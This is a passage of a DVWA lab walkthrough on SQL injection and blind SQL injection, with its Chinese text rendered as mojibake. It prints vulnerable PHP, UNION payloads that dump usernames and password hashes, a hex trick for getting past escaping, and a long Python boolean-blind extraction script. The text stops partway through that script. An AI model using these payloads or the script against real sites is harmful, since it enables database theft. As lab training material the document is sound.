###  è·å–æ•°æ®åº“ä¸­çš„è¡¨ 

`æŠ“åŒ…æ›´æ”¹å‚æ•°idä¸º1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #ï¼ŒæŸ¥è¯¢æˆåŠŸï¼š`

![MlBK91.png](https://s2.ax1x.com/2019/11/11/MlBK91.png)

` è¯´æ˜æ•°æ®åº“dvwaä¸­ä¸€å…±æœ‰ä¸¤ä¸ªè¡¨ï¼Œguestbookä¸usersã€‚ `

###  è·å–è¡¨ä¸­çš„å­—æ®µå 

`æŠ“åŒ…æ›´æ”¹å‚æ•°idä¸º1 union select 1,group_concat(column_name) from information_schema.columns where table_name=â€™users â€™#ï¼ŒæŸ¥è¯¢å¤±è´¥ï¼š`

![Mls0jx.png](https://s2.ax1x.com/2019/11/11/Mls0jx.png)

 è¿™æ˜¯å› ä¸ºå•å¼•å·è¢«è½¬ä¹‰äº†ï¼Œå˜æˆäº†\â€™ã€‚å¯ä»¥åˆ©ç”¨16è¿›åˆ¶è¿›è¡Œç»•è¿‡ '' 

`æŠ“åŒ…æ›´æ”¹å‚æ•°idä¸º1 union select 1,group_concat(column_name) from information_schema.columns where table_name=0x7573657273 #ï¼ŒæŸ¥è¯¢æˆåŠŸï¼š`![MlrFwF.png](https://s2.ax1x.com/2019/11/11/MlrFwF.png)

` è¯´æ˜usersè¡¨ä¸­æœ‰8ä¸ªå­—æ®µï¼Œåˆ†åˆ«æ˜¯user_id,first_name,last_name,user,password,avatar,last_login,failed_loginã€‚ `

###  ä¸‹è½½æ•°æ® 

`æŠ“åŒ…ä¿®æ”¹å‚æ•°idä¸º1 or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #ï¼ŒæŸ¥è¯¢æˆåŠŸï¼š`

![MlraOf.png](https://s2.ax1x.com/2019/11/11/MlraOf.png)

## çº§åˆ«ï¼šhigh

### SQL Injection Source

```php
<?php

if( isset( $_SESSION [ 'id' ] ) ) {
    // Get input
    $id = $_SESSION[ 'id' ];

    // Check database
    $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;";
    $result = mysqli_query($GLOBALS["___mysqli_ston"], $query ) or die( '<pre>Something went wrong.</pre>' );

    // Get results
    while( $row = mysqli_fetch_assoc( $result ) ) {
        // Get values
        $first = $row["first_name"];
        $last  = $row["last_name"];

        // Feedback for end user
        echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);        
}

?>
```

###  åˆ†æï¼š

 ä¸Mediumçº§åˆ«çš„ä»£ç ç›¸æ¯”ï¼ŒHighçº§åˆ«çš„åªæ˜¯åœ¨SQLæŸ¥è¯¢è¯­å¥ä¸­æ·»åŠ äº†LIMIT 1ï¼Œå¸Œæœ›ä»¥æ­¤æ§åˆ¶åªè¾“å‡ºä¸€ä¸ªç»“æœã€‚ 

###  æ¼æ´åˆ©ç”¨: 

 è™½ç„¶æ·»åŠ äº†LIMIT 1ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡#å°†å…¶æ³¨é‡Šæ‰ã€‚ç”±äºæ‰‹å·¥æ³¨å…¥çš„è¿‡ç¨‹ä¸Lowçº§åˆ«åŸºæœ¬ä¸€æ ·ï¼Œç›´æ¥æœ€åä¸€æ­¥æ¼”ç¤ºä¸‹è½½æ•°æ®ã€‚ 

`è¾“å…¥1' or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #ï¼ŒæŸ¥è¯¢æˆåŠŸï¼š`

![M3q1r6.png](https://s2.ax1x.com/2019/11/12/M3q1r6.png)

Highçº§åˆ«çš„æŸ¥è¯¢æäº¤é¡µé¢ä¸æŸ¥è¯¢ç»“æœæ˜¾ç¤ºé¡µé¢ä¸æ˜¯åŒä¸€ä¸ªï¼Œä¹Ÿæ²¡æœ‰æ‰§è¡Œ302è·³è½¬ï¼Œè¿™æ ·åšçš„ç›®çš„æ˜¯ä¸ºäº†é˜²æ­¢ä¸€èˆ¬çš„sqlmapæ³¨å…¥ï¼Œå› ä¸ºsqlmapåœ¨æ³¨å…¥è¿‡ç¨‹ä¸­ï¼Œæ— æ³•åœ¨æŸ¥è¯¢æäº¤é¡µé¢ä¸Šè·å–æŸ¥è¯¢çš„ç»“æœï¼Œæ²¡æœ‰äº†åé¦ˆï¼Œä¹Ÿå°±æ²¡åŠæ³•è¿›ä¸€æ­¥æ³¨å…¥ã€‚

# DVWAâ€”â€”SQL Injection (Blind)

## çº§åˆ«ï¼šlow

### SQL Injection (Blind) Source

```php
<?php

if( isset( $_GET[ 'Submit' ] ) ) {
    // Get input
    $id = $_GET[ 'id' ];

    // Check database
    $getid  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $getid ); // Removed 'or die' to suppress mysql errors

    // Get results
    $num = @mysqli_num_rows( $result ); // The '@' character suppresses errors
    if( $num > 0 ) {
        // Feedback for end user
        echo '<pre>User ID exists in the database.</pre>';
    }
    else {
        // User wasn't found, so the page wasn't!
        header( $_SERVER[ 'SERVER_PROTOCOL' ] . ' 404 Not Found' );

        // Feedback for end user
        echo '<pre>User ID is MISSING from the database.</pre>';
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

?>
```

###  åˆ†æï¼š

 Lowçº§åˆ«çš„ä»£ç å¯¹å‚æ•°idæ²¡æœ‰åšä»»ä½•æ£€æŸ¥ã€è¿‡æ»¤ï¼Œå­˜åœ¨æ˜æ˜¾çš„SQLæ³¨å…¥æ¼æ´ï¼ŒåŒæ—¶SQLè¯­å¥æŸ¥è¯¢è¿”å›çš„ç»“æœåªæœ‰ä¸¤ç§ï¼š 

` User ID exists in the database.ä¸ User ID is MISSING from the database. `

 æ‰€ä»¥è¿™é‡Œæ˜¯SQLç›²æ³¨æ¼æ´ã€‚ 

###   æ¼æ´åˆ©ç”¨

 è¾“å…¥1 ï¼Œå‘ç° 

![M8pniV.png](https://s2.ax1x.com/2019/11/12/M8pniV.png)

 è¾“å…¥ 1'ï¼Œ å‘ç° 

![M8CxaR.png](https://s2.ax1x.com/2019/11/12/M8CxaR.png)



 è§‚å¯Ÿåˆ°ä»–è¿™é‡Œåªä¼šå‡ºç°æ­£ç¡®æˆ–è€…é”™è¯¯çš„ä¸¤ç§é¡µé¢ï¼Œåˆ¤å®šä»–æ˜¯ä¸€ä¸ªå¸ƒå°”ç›²æ³¨ 

###  è·å–æ•°æ®åº“é•¿åº¦ 

```python
    def get_database_length(self):
        self.database_length = 0
        for i in range(1,30):
            self.process('get_database_length',i,30)
            theurl = self.url + "1' and length(database())={0}%23".format(str(i)) + "&Submit=Submit#"
            html = self.s.get(theurl,headers=self.headers).text
            if self.check(html):
                self.database_length = i
                break
        if self.database_length > 0:
            print('\n==>',self.database_length)
        else:
            print("\ncan not get the database_length")
```

è¿è¡Œç»“æœï¼š

![MGOfVP.png](https://s2.ax1x.com/2019/11/13/MGOfVP.png)

### æ£€æŸ¥é¡µé¢æ˜¯å¦æ­£å¸¸

```python
 def check(self,text):
        if "User ID exists in the database." in text:
            return True
        elif "User ID is MISSING from the database." in text:
            return False
```

### è·å–æ•°æ®åº“å

```python
    def get_database(self):
        self.database = ''
        for i in range(1,self.database_length+1):
            for j in self.zifuji:
                self.process(str(i) + ' get_database',j,self.database_length+1)
                theurl = self.url + "1' and ascii(substring(database(),{0},1))={1}%23".format(str(i),str(j)) + "&Submit=Submit#"
                html = self.s.get(theurl,headers=self.headers).text
                if self.check(html):
                    self.database += chr(j)
                    break
            if len(self.database) != i:
                self.database += '666'
        if len(self.database) > 0:
            print('\n==>',self.database)
        else:
            print("\n can not get the database")
```

è¿è¡Œç»“æœï¼š

![MGjklQ.png](https://s2.ax1x.com/2019/11/13/MGjklQ.png)

### è·å–è¡¨é•¿

```python
    def get_table_length(self):
        for i in range(1,50):
            self.process('get_table_length',i,50)
            theurl = self.url + "1' and (select length(group_concat(table_name)) as a from information_schema.tables where table_schema=database() having a={0})%23".format(str(i)) + "&Submit=Submit#"
            html = self.s.get(theurl,headers=self.headers).text
            if self.check(html):
                self.table_length.append(i)
                break
        if self.table_length[0] > 0:
            print('\n==>',self.table_length)
        else:
            print('\ncan not get the table_length')
```

è¿è¡Œç»“æœï¼š

![MGjdfO.png](https://s2.ax1x.com/2019/11/13/MGjdfO.png)

### è·å–è¡¨å

```python
    def get_table_name(self):
        name = ''
        for i in range(1,self.table_length[0]+1):
            for j in self.zifuji:
                self.process('{0} get_table_name'.format(i),j,50)
                theurl = self.url + "1' and (select ascii(substring(group_concat(table_name),{0},1)) as a from information_schema.tables where table_schema=database() having a={1})%23".format(str(i),str(j)) + "&Submit=Submit#"
                html = self.s.get(theurl,headers=self.headers).text
                if self.check(html):
                    name += chr(j)
                    break
            if len(name) != i:
                name += '|'
        if len(name) > 0:
            print('\n==>',name)
            self.table_name.append(name)
        else:
            print('\ncan not get the table_name')
```

è¿è¡Œç»“æœï¼š

![MJie0g.png](https://s2.ax1x.com/2019/11/13/MJie0g.png)

### è·å–è¡¨åˆ—æ•°é‡

```python
    def get_column_num(self,table_name):
        self.column_num = 0
        for i in range(1,30):
            self.process('get_column_num',i,30)
            theurl = self.url + "1' and (select count(column_name) as a from information_schema.columns where table_schema=database() and table_name='{0}' having a={1})%23".format(table_name,str(i)) + "&Submit=Submit#"
            html = self.s.get(theurl,headers=self.headers).text
            if self.check(html):
                self.column_num = i
                break
        if self.column_num > 0:
            print('\n==>',self.column_num)
```

### è·å–æ€»é•¿åº¦

```python
    def get_column_length(self,table_name):
        for i in range(1,100):
            self.process('get_column_length',i,100)
            theurl = self.url + "1' and (select length(group_concat(column_name)) as a from information_schema.columns where table_schema=database() and table_name='{0}' having a={1})%23".format(table_name,str(i)) + "&Submit=Submit#"
            html = self.s.get(theurl,headers=self.headers).text
            if self.check(html):
                self.column_length.append(i)
                break
        if len(self.column_length) >= 1:
            print('\n==>',self.column_length)
        else:
            print('\ncan not get the column_length')
```

### è·å–åˆ—å

```python
    def get_column_name(self,table_name):
        name = ''
        for i in range(1,self.column_length[0]+1):
            for j in self.zifuji:
                self.process('{0} get_column_name'.format(str(i)),j,100)
                theurl = self.url + "1' and (select ascii(substring(group_concat(column_name),{0},1)) as a from information_schema.columns where table_schema=database() and table_name='{1}' having a={2})%23".format(str(i),table_name,str(j)) + "&Submit=Submit#"
                html = self.s.get(theurl,headers=self.headers).text
                if self.check(html):
                    name += chr(j)
                    break
            if len(name) != i:
                name += '|'
        if len(name) == self.column_length[0]:
            self.column_name.append(name)
            print('\n==>',self.column_name[0])
        else:
            print('\ncan not get the column_name')
```

è¿è¡Œç»“æœï¼š

![MJFlUH.png](https://s2.ax1x.com/2019/11/13/MJFlUH.png)

### è·å–å­—æ®µæ•°ç›®

```python
    def get_word_num(self,table_name,column_name):
        for i in range(1,100):
            self.process('get_word_num',i,30)
            theurl = self.url + "1' and (select count({0}) as a from {1} having a={2})%23".format(column_name,table_name,str(i)) + "&Submit=Submit#"
            html = self.s.get(theurl,headers=self.headers).text
            if self.check(html):
                self.word_num = i
                break
        if self.word_num > 0:
            print('\n==>',self.word_num)
        else:
            print('\ncan not get the word_num')
```

### è·å–åˆ—é•¿

```python
    def get_word_length(self,table_name,column_name):
        for i in range(1,200):
            self.process('get_{0}_length'.format(column_name),i,200)
            theurl = self.url + "1' and (select length(group_concat({0})) as a from {1} having a={2})%23".format(column_name,table_name,str(i)) + "&Submit=Submit#"
            html = self.s.get(theurl,headers=self.headers).text
            if self.check(html):
                self.word_length.append(i)
                break
        if len(self.word_length) >= 1:
            print('\n==>',self.word_length)
        else:
            print('\ncan not get the word length') 
```

### è·å–æ•°æ®

```python
    def get_word_name(self,table_name,column_name,word_num):
        name = ''
        for i in range(1,self.word_length[word_num]+1):
            for j in self.zifuji:
                self.process('get_{0}_name'.format(str(i)),j,100)
                theurl = self.url + "1' and (select ascii(substring(group_concat({0}),{1},1)) as a from {2} having a={3})%23".format(column_name,str(i),table_name,str(j)) + "&Submit=Submit#"
                html = self.s.get(theurl,headers=self.headers).text
                if self.check(html):
                    name += chr(j)
                    break
            if len(name) != i:
                name += '|'
        self.word_name.append(name)
        print('\n==>',self.word_name[word_num])
```

è¿è¡Œç»“æœï¼š

![MJAW4J.png](https://s2.ax1x.com/2019/11/13/MJAW4J.png)

## çº§åˆ«ï¼šmedium

###  SQL Injection (Blind) Source

```php
<?php

if( isset( $_POST[ 'Submit' ]  ) ) {
    // Get input
    $id = $_POST[ 'id' ];
    $id = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $id ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

    // Check database
    $getid  = "SELECT first_name, last_name FROM users WHERE user_id = $id;";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $getid ); // Removed 'or die' to suppress mysql errors

    // Get results
    $num = @mysqli_num_rows( $result ); // The '@' character suppresses errors
    if( $num > 0 ) {
        // Feedback for end user
        echo '<pre>User ID exists in the database.</pre>';
    }
    else {
        // Feedback for end user
        echo '<pre>User ID is MISSING from the database.</pre>';
    }

    //mysql_close();
}

?>
```

### åˆ†æ

mediumçº§åˆ«ä¸lowçº§åˆ«å·®ä¸å¤šï¼Œ å°†getæ–¹å¼æ”¹æˆpostæ–¹å¼å³å¯ï¼Œæ•°å­—å‹æ³¨å…¥ã€‚

ç”±äºä»–ä¼šè¿‡æ»¤å•å¼•å·ï¼Œæ‰€ä»¥éœ€è¦è½¬æˆ16è¿›åˆ¶ã€‚

```python
 def tranhex(self,str1):
        result = '0x'
        for i in str1:
            result += hex(ord(i))[2:]
        return result
```

è¿è¡Œç»“æœï¼š

![MJmPQs.png](https://s2.ax1x.com/2019/11/13/MJmPQs.png)

![MJmaSH.png](https://s2.ax1x.com/2019/11/13/MJmaSH.png)

## çº§åˆ«ï¼šhigh

### SQL Injection (Blind) Source

```php
<?php

if( isset( $_COOKIE[ 'id' ] ) ) {
    // Get input
    $id = $_COOKIE[ 'id' ];

    // Check database
    $getid  = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $getid ); // Removed 'or die' to suppress mysql errors

    // Get results
    $num = @mysqli_num_rows( $result ); // The '@' character suppresses errors
    if( $num > 0 ) {
        // Feedback for end user
        echo '<pre>User ID exists in the database.</pre>';
    }
    else {
        // Might sleep a random amount
        if( rand( 0, 5 ) == 3 ) {
            sleep( rand( 2, 4 ) );
        }

        // User wasn't found, so the page wasn't!
        header( $_SERVER[ 'SERVER_PROTOCOL' ] . ' 404 Not Found' );

        // Feedback for end user
        echo '<pre>User ID is MISSING from the database.</pre>';
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

?>
```

### åˆ†æ

éšä¾¿å†™ä¸ª1æäº¤

![MJunM9.png](https://s2.ax1x.com/2019/11/13/MJunM9.png)

 æ˜¯ä¸€ä¸ªcookieæ³¨å…¥ 

![MJuLLR.png](https://s2.ax1x.com/2019/11/13/MJuLLR.png)

```python
    def get_headers(self,payload):
        headers = {
            'Cookie': "id={0}; security=high; PHPSESSID=ms11imgpftrmfcp27rmk9s006c".format(payload)
        }
```

è¿è¡Œç»“æœï¼š

![MYZAMR.png](https://s2.ax1x.com/2019/11/13/MYZAMR.png)

## å®Œæ•´è„šæœ¬

```python 
from Injection import Injection

def main(url):
    Injection(url).run()

if __name__ == '__main__':
    url = "http://192.168.74.1/DVWA/vulnerabilities/sqli_blind/?id="
    main(url
```

### low:

```python
import requests
import string

class Injection:
    def __init__(self,url):
        self.url = url
        self.s = requests.session()
        self.zifuji = [44,48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 95, 45, 64, 33, 38, 36]
        self.headers = {
            'Cookie': 'security=low; PHPSESSID=ms11imgpftrmfcp27rmk9s006c'
        }
    def process(self,yourstr,num1,num2):
        print("[+] Please wait ... {0} [{1}]/[{2}]".format(yourstr,str(num1),str(num2)),end='\r')
    def check(self,text):
        if "User ID exists in the database." in text:
            return True
        elif "User ID is MISSING from the database." in text:
            return False
    def run(self):
        self.get_itsnum()
        self.get_database_length()
        self.get_database()
        self.get_table_num()
        self.table_length = []
        self.table_name = []
        self.get_table_length()
        self.get_table_name()
        table_name = input('[-] table_name: ')
        self.get_column_num(table_name)
        self.column_length = []
        self.column_name = []
        self.get_column_length(table_name)
        self.get_column_name(table_name)
        column_names = input('[-] column_name: ').split(',')
        self.word_num = 0
        self.get_word_num(table_name,column_names[0])
        self.word_name = []
        self.word_length = []
        for i in range(len(column_names)):
            print(column_names[i])
            self.get_word_length(table_name,column_names[i])
            self.get_word_name(table_name,column_names[i],i)
        
    def get_itsnum(self):
        self.itsnum = 0
        for i in range(1,50):
            self.process('get_itsnum',i,50)
            theurl = self.url + "1' order by {0}%23".format(str(i)) + "&Submit=Submit#"
            html = self.s.get(theurl,headers=self.headers).text
            if not self.check(html):
                self.itsnum = i - 1
                break
        if self.itsnum > 0:
            print('\n==>',self.itsnum)
        else:
            print("\ncan not get the itsnum")
    def get_database_length(self):
        self.database_length = 0
        for i in range(1,30):
            self.process('get_database_length',i,30)
            theurl = self.url + "1' and length(database())={0}%23".format(str(i)) + "&Submit=Submit#"
            html = self.s.get(theurl,headers=self.headers).text
            if self.check(html):
                self.database_length = i
                break
        if self.database_length > 0:
            print('\n==>',self.database_length)
        else:
            print("\ncan not get the database_length")
    def get_database(self):
        self.database = ''
        for i in range(1,self.database_length+1):
            for j in self.zifuji:
                self.process(str(i) + ' get_database',j,self.database_length+1)
                theurl = self.url + "1' and ascii(substring(database(),{0},1))={1}%23".format(str(i),str(j)) + "&Submit=Submit#"
                html = self.s.get(theurl,headers=self.headers).text
                if self.check(html):
                    self.database += chr(j)
                    break
            if len(self.database) != i:
                self.database += '666'
        if len(self.database) > 0:
            print('\n==>',self.database)
        else:
            print("\n can not get the database")
    def get_table_num(self):
        self.table_num = 0
        for i in range(1,30):
            self.process('get_table_num',i,30)
            theurl = self.url + "1' and (select count(table_name)a from information_schema.tables where table_schema=database() having a={0})%23".format(str(i)) + "&Submit=Submit#"
            html = self.s.get(theurl,headers=self.headers).text
            if self.check(html):
                self.table_num = i
                break
        if self.table_num > 0:
            print('\n==>',self.table_num)
        else:
            print("\ncan not get the table_num")           
    def get_table_length(self):
        for i in range(1,50):
            self.process('get_table_length',i,50)
            theurl = self.url + "1' and (select length(group_concat(table_name)) as a from information_schema.tables where table_schema=database() having a={0})%23".format(str(i)) + "&Submit=Submit#"
            html = self.s.get(theurl,headers=self.headers).text
            if self.check(html):
                self.table_length.append(i)
                break
        if self.table_length[0] > 0:
            print('\n==>',self.table_length)
        else:
            print('\ncan not get the table_length')
    def get_table_name(self):
        name = ''
        for i in range(1,self.table_length[0]+1):
            for j in self.zifuji:
                self.process('{0} get_table_name'.format(i),j,50)
                theurl = self.url + "1' and (select ascii(substring(group_concat(table_name),{0},1)) as a from information_schema.tables where table_schema=database() having a={1})%23".format(str(i),str(j)) + "&Submit=Submit#"
                html = self.s.get(theurl,headers=self.headers).text
                if self.check(html):
                    name += chr(j)
                    break
            if len(name) != i:
                name += '|'
        if len(name) > 0:
            print('\n==>',name)
            self.table_name.append(name)
        else:
            print('\ncan not get the table_name')
    def get_column_num(self,table_name):
        self.column_num = 0
        for i in range(1,30):
            self.process('get_column_num',i,30)
            theurl = self.url + "1' and (select count(column_name) as a from information_schema.columns where table_schema=database() and table_name='{0}' having a={1})%23".format(table_name,str(i)) + "&Submit=Submit#"
            html = self.s.get(theurl,headers=self.headers).text
            if self.check(html):
                self.column_num = i
                break
        if self.column_num > 0:
            print('\n==>',self.column_num)
    def get_column_length(self,table_name):
        for i in range(1,100):
            self.process('get_column_length',i,100)
            theurl = self.url + "1' and (select length(group_concat(column_name)) as a from information_schema.columns where table_schema=database() and table_name='{0}' having a={1})%23".format(table_name,str(i)) + "&Submit=Submit#"
            html = self.s.get(theurl,headers=self.headers).text
            if self.check(html):
                self.column_length.append(i)
                break
        if len(self.column_length) >= 1:
            print('\n==>',self.column_length)
        else:
            print('\ncan not get the column_length')
    def get_column_name(self,table_name):
        name = ''
        for i in range(1,self.column_length[0]+1):
            for j in self.zifuji:
                self.process('{0} get_column_name'.format(str(i)),j,100)
                theurl = self.url + "1' and (select ascii(substring(group_concat(column_name),{0},1)) as a from information_schema.columns where table_schema=database() and table_name='{1}' having a={2})%23".format(str(i),table_name,str(j)) + "&Submit=Submit#"
                html = self.s.get(theurl,headers=self.headers).text
                if self.check(html):
                    name += chr(j)
                    break
            if len(name) != i:
                name += '|'
        if len(name) == self.column_length[0]:
            self.column_name.append(name)
            print('\n==>',self.column_name[0])
        else:
            print('\ncan not get the column_name')
    def get_word_num(self,table_name,column_name):
        for i in range(1,100):
            self.process('get_word_num',i,30)
            theurl = self.url + "1' and (select count({0}) as a from {1} having a={2})%23".format(column_name,table_name,str(i)) + "&Submit=Submit#"
            html = self.s.get(theurl,headers=self.headers).text
            if self.check(html):
                self.word_num = i
                break
        if self.word_num > 0:
            print('\n==>',self.word_num)
        else:
            print('\ncan not get the word_num')
    def get_word_length(self,table_name,column_name):
        for i in range(1,200):
            self.process('get_{0}_length'.format(column_name),i,200)
            theurl = self.url + "1' and (select length(group_concat({0})) as a from {1} having a={2})%23".format(column_name,table_name,str(i)) + "&Submit=Submit#"
            html = self.s.get(theurl,headers=self.headers).text
            if self.check(html):
                self.word_length.append(i)
                break
        if len(self.word_length) >= 1:
            print('\n==>',self.word_length)
        else:
            print('\ncan not get the word length') 
    def get_word_name(self,table_name,column_name,word_num):
        name = ''
        for i in range(1,self.word_length[word_num]+1):
            for j in self.zifuji:
                self.process('get_{0}_name'.format(str(i)),j,100)
                theurl = self.url + "1' and (select ascii(substring(group_concat({0}),{1},1)) as a from {2} having a={3})%23".format(column_name,str(i),table_name,str(j)) + "&Submit=Submit#"
                html = self.s.get(theurl,headers=self.headers).text
                if self.check(html):
                    name += chr(j)
                    break
            if len(name) != i:
                name += '|'
        self.word_name.append(name)
        print('\n==>',self.word_name[word_num])
```

### medium

```python
import requests
import string

class Injection:
    def __init__(self,url):
        self.url = url
        self.s = requests.session()
        self.zifuji = [44,48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 95, 45, 64, 33, 38, 36]
        self.headers = {
            'Cookie': 'security=medium; PHPSESSID=ms11imgpftrmfcp27rmk9s006c'
        }
    def process(self,yourstr,num1,num2):
        print("[+] Please wait ... {0} [{1}]/[{2}]".format(yourstr,str(num1),str(num2)),end='\r')
    def check(self,text):
        if "User ID exists in the database." in text:
            return True
        elif "User ID is MISSING from the database." in text:
            return False
    def tranhex(self,str1):
        result = '0x'
        for i in str1:
            result += hex(ord(i))[2:]
        return result
    def run(self):
        self.get_itsnum()
        self.get_database_length()
        self.get_database()
        self.get_table_num()
        self.table_length = []
        self.table_name = []
        self.get_table_length()
        self.get_table_name()
        table_name = input('[-] table_name: ')
        self.get_column_num(table_name)
        self.column_length = []
        self.column_name = []
        self.get_column_length(table_name)
        self.get_column_name(table_name)
        column_names = input('[-] column_name: ').split(',')
        self.word_num = 0
        self.get_word_num(table_name,column_names[0])
        self.word_name = []
        self.word_length = []
        for i in range(len(column_names)):
            print(column_names[i])
            self.get_word_length(table_name,column_names[i])
            self.get_word_name(table_name,column_names[i],i)
        
    def get_itsnum(self):
        self.itsnum = 0
        for i in range(1,50):
            self.process('get_itsnum',i,50)
            data = {
                'id':"1 order by {0}".format(str(i)),
                'Submit':'Submit',
            }
            html = self.s.post(self.url,data=data,headers=self.headers).text
            if not self.check(html):
                self.itsnum = i - 1
                break
        if self.itsnum > 0:
            print('\n==>',self.itsnum)
        else:
            print("\ncan not get the itsnum")
    def get_database_length(self):
        self.database_length = 0
        for i in range(1,30):
            self.process('get_database_length',i,30)
            data = {
                'id':"1 and length(database())={0}".format(str(i)),
                'Submit':'Submit',
            }
            html = self.s.post(self.url,data=data,headers=self.headers).text
            if self.check(html):
                self.database_length = i
                break
        if self.database_length > 0:
            print('\n==>',self.database_length)
        else:
            print("\ncan not get the database_length")
    def get_database(self):
        self.database = ''
        for i in range(1,self.database_length+1):
            for j in self.zifuji:
                self.process(str(i) + ' get_database',j,self.database_length+1)
                data = {
                    'id':"1 and ascii(substring(database(),{0},1))={1}".format(str(i),str(j)),
                    'Submit':'Submit',
                }
                html = self.s.post(self.url,data=data,headers=self.headers).text
                if self.check(html):
                    self.database += chr(j)
                    break
            if len(self.database) != i:
                self.database += '666'
        if len(self.database) > 0:
            print('\n==>',self.database)
        else:
            print("\n can not get the database")
    def get_table_num(self):
        self.table_num = 0
        for i in range(1,30):
            self.process('get_table_num',i,30)
            data = {
                'id':"1 and (select count(table_name)a from information_schema.tables where table_schema=database() having a={0})".format(str(i)),
                'Submit':'Submit',
            }
            html = self.s.post(self.url,data=data,headers=self.headers).text
            if self.check(html):
                self.table_num = i
                break
        if self.table_num > 0:
            print('\n==>',self.table_num)
        else:
            print("\ncan not get the table_num")           
    def get_table_length(self):
        for i in range(1,50):
            self.process('get_table_length',i,50)
            data = {
                'id':"1 and (select length(group_concat(table_name)) as a from information_schema.tables where table_schema=database() having a={0})".format(str(i)),
                'Submit':'Submit',
            }
            html = self.s.post(self.url,data=data,headers=self.headers).text
            if self.check(html):
                self.table_length.append(i)
                break
        if self.table_length[0] > 0:
            print('\n==>',self.table_length)
        else:
            print('\ncan not get the table_length')
    def get_table_name(self):
        name = ''
        for i in range(1,self.table_length[0]+1):
            for j in self.zifuji:
                self.process('{0} get_table_name'.format(i),j,50)
                data = {
                    'id':"1 and (select ascii(substring(group_concat(table_name),{0},1)) as a from information_schema.tables where table_schema=database() having a={1})".format(str(i),str(j)),
                    'Submit':'Submit',
                }
                html = self.s.post(self.url,data=data,headers=self.headers).text
                if self.check(html):
                    name += chr(j)
                    break
            if len(name) != i:
                name += '|'
        if len(name) > 0:
            print('\n==>',name)
            self.table_name.append(name)
        else:
            print('\ncan not get the table_name')
    def get_column_num(self,table_name):
        self.column_num = 0
        table_name = self.tranhex(table_name)
        print(table_name)
        for i in range(1,30):
            self.process('get_column_num',i,30)
            data = {
                'id':"1 and (select count(column_name) as a from information_schema.columns where table_schema=database() and table_name={0} having a={1})".format(table_name,str(i)),
                'Submit':'Submit',
            }
            html = self.s.post(self.url,data=data,headers=self.headers).text
            if self.check(html):
                self.column_num = i
                break
        if self.column_num > 0:
            print('\n==>',self.column_num)
    def get_column_length(self,table_name):
        table_name = self.tranhex(table_name)
        for i in range(1,100):
            self.process('get_column_length',i,100)
            data = {
                'id':"1 and (select length(group_concat(column_name)) as a from information_schema.columns where table_schema=database() and table_name={0} having a={1})".format(table_name,str(i)),
                'Submit':'Submit',
            }
            html = self.s.post(self.url,data=data,headers=self.headers).text
            if self.check(html):
                self.column_length.append(i)
                break
        if len(self.column_length) >= 1:
            print('\n==>',self.column_length)
        else:
            print('\ncan not get the column_length')
    def get_column_name(self,table_name):
        table_name = self.tranhex(table_name)
        name = ''
        for i in range(1,self.column_length[0]+1):
            for j in self.zifuji:
                self.process('{0} get_column_name'.format(str(i)),j,100)
                data = {
                    'id':"1 and (select ascii(substring(group_concat(column_name),{0},1)) as a from information_schema.columns where table_schema=database() and table_name={1} having a={2})".format(str(i),table_name,str(j)),
                    'Submit':'Submit',
                }
                html = self.s.post(self.url,data=data,headers=self.headers).text
                if self.check(html):
                    name += chr(j)
                    break
            if len(name) != i:
                name += '|'
        if len(name) == self.column_length[0]:
            self.column_name.append(name)
            print('\n==>',self.column_name[0])
        else:
            print('\ncan not get the column_name')
    def get_word_num(self,table_name,column_name):
        for i in range(1,100):
            self.process('get_word_num',i,30)
            data = {
                'id':"1 and (select count({0}) as a from {1} having a={2})".format(column_name,table_name,str(i)),
                'Submit':'Submit',
            }
            html = self.s.post(self.url,data=data,headers=self.headers).text
            if self.check(html):
                self.word_num = i
                break
        if self.word_num > 0:
            print('\n==>',self.word_num)
        else:
            print('\ncan not get the word_num')
    def get_word_length(self,table_name,column_name):
        for i in range(1,200):
            self.process('get_{0}_length'.format(column_name),i,200)
            data = {
                'id':"1 and (select length(group_concat({0})) as a from {1} having a={2})".format(column_name,table_name,str(i)),
                'Submit':'Submit',
            }
            html = self.s.post(self.url,data=data,headers=self.headers).text
            if self.check(html):
                self.word_length.append(i)
                break
        if len(self.word_length) >= 1:
            print('\n==>',self.word_length)
        else:
            print('\ncan not get the word length') 
    def get_word_name(self,table_name,column_name,word_num):
        name = ''
        for i in range(1,self.word_length[word_num]+1):
            for j in self.zifuji:
                self.process('get_{0}_name'.format(str(i)),j,100)
                data = {
                    'id':"1 and (select ascii(substring(group_concat({0}),{1},1)) as a from {2} having a={3})".format(column_name,str(i),table_name,str(j)),
                    'Submit':'Submit',
                }
